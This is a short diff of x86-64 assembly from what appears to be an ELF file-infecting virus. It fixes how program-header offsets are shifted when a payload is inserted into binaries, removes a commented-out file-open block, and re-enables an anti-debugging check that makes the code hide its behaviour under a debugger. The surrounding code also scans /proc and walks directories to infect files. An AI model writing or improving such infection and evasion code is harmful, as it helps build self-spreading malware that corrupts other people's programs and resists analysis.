@@ -265,7 +265,7 @@ modify_segements:
 		cmp rax, r11
 		jl end_if_data_phdr2
 			mov rax, QWORD[r8 + elf_struc.bits_added]
-			mov QWORD[rdi + phdr.p_offset], rax
+			add QWORD[rdi + phdr.p_offset], rax
 			mov rax, QWORD[rdi + phdr.p_vaddr]
 			cmp rax, 0
 			jmp end_if_data_phdr2
@@ -426,19 +426,6 @@ rewrite_binary:
 
 	add r13, rdx
 	call memcpy									;copi la fin du bin
-
-
-	;lea rdi, [rel data_name]
-	;mov rsi, 577
-	;mov rdx, 493
-	;mov rax, sys_open
-	;push r11
-	;syscall
-	;padding
-	;pop r11
-	;mov QWORD[r11 + elf_struc.fd2], rax
-	;cmp rax, 0
-	;jl ret_0					; open .data file
 
 	mov rdi, QWORD[r11 + elf_struc.path]
 	mov rsi, 513
@@ -775,13 +762,12 @@ check_debugger:
 main:
 	call check_debugger
 	cmp rax, 1
-	;je jmp_old_entry
+	je jmp_old_entry
 	lea rdi, [rel proc_dir]
 	lea rsi, [rel check_proc]
 	call process_dir
 	cmp rax, 1
 	je jmp_old_entry
-	print_nl
 	lea rdi, [rel dir1]
 	lea rsi, [rel process_file]
 	call process_dir
